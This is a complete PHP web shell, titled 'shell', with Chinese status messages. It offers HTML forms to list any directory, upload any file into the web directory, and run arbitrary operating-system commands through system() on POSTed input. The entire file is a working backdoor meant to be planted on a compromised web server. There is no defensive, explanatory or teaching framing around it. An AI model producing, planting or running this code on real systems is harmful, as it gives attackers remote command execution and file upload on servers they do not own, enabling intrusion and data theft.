<!doctype html>
<html>
<head>
    <meta charset="gb2312">
    <title>shell</title>
</head>
<body>
<form action="" method="post">
    <input type="text" name="dir">
    <input type="submit" value="scan_dir" >
</form>

<form action="" method="post"  enctype="multipart/form-data">

    <input type="file" name="file" id="file">
    <input type="submit" value="Upload">

</form>

<form method="post">
    <input type="text" name="cmd">
    <input type="submit" value="RUN" >
</form>
</body>
</html>
<?php
echo "当前物理路径:".getcwd()."<hr>";
function dirs()
{
    $dir=scandir($_POST['dir']);
    for($a=0;$a<count($dir);$a++){
        echo $dir[$a]."<br>";
    }
}
function files (){
    if($_FILES['file']['error']>0){
        echo "上传失败";
    }else{
        move_uploaded_file($_FILES['file']['tmp_name'],"./".$_FILES['file']['name']);
        echo "<br>上传成功".getcwd()."/".$_FILES["file"]['name'];
    }
}
function cmds(){
    if($_POST['cmd']==""){
        echo "<br>请输出命令";
    }else{
        /*$m=exec($_POST["cmd"]);
        echo $m;*/
        system( $_POST["cmd"]);
    }
}
if(isset($_POST["cmd"])){
    cmds();

}elseif(isset($_FILES['file']))
{
    files();
}elseif(isset($_POST['dir']) && is_dir($_POST['dir']))
{
    dirs();
}
?>

